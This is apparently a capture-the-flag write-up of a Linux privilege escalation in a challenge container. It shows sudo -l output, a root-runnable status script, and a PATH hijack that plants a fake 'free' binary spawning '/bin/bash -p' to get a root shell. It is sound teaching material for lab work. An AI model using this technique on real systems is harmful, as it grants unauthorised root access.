
# Concept

* Linux privilege escalation 

---

First we run `find / -perm -4000 -type f 2>/dev/null`

To see if there are any funky binaries to get a priv esc. There is nothing

Then we run `sudo -l` to see what we can run as sudo
```
🏠 chiuser @ Dosis Neighborhood ~/bin 🔍 $ sudo -l
Matching Defaults entries for chiuser on a5f16c0fac2b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, secure_path=/home/chiuser/bin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+="API_ENDPOINT API_PORT RESOURCE_ID HHCUSERNAME", env_keep+=PATH

User chiuser may run the following commands on a5f16c0fac2b:
    (root) NOPASSWD: /usr/local/bin/system_status.sh
```

Bingo.... we can run system_status.sh as root with no password 

```
 cat /usr/local/bin/system_status.sh 
#!/bin/bash
echo "=== Dosis Neighborhood Fire Alarm System Status ==="
echo "Fire alarm system monitoring active..."
echo ""
echo "System resources (for alarm monitoring):" 
free -h
echo -e "\nDisk usage (alarm logs and recordings):"
df -h
echo -e "\nActive fire department connections:"
w
echo -e "\nFire alarm monitoring processes:"
ps aux | grep -E "(alarm|fire|monitor|safety)" | head -5 || echo "No active fire monitoring processes detected"
echo ""
echo "🔥 Fire Safety Status: All systems operational"
echo "🚨 Emergency Response: Ready"
echo "📍 Coverage Area: Dosis Neighborhood (all sectors)"
```

all we have to do is create a binary with the same name as one in the script and write it to give us a bash shell. since /home/chiuser/bin is the first binary path it will be checked first

we create a file called free in /bin we make it executable using chmod +x free

we nano into it and add the shebang for bash and add code to spawn a shell 

```
#!/bin/bash 

/bin/bash -p 
```

Running the script again gives us our root shell and we can now run the file to solve the challenge. 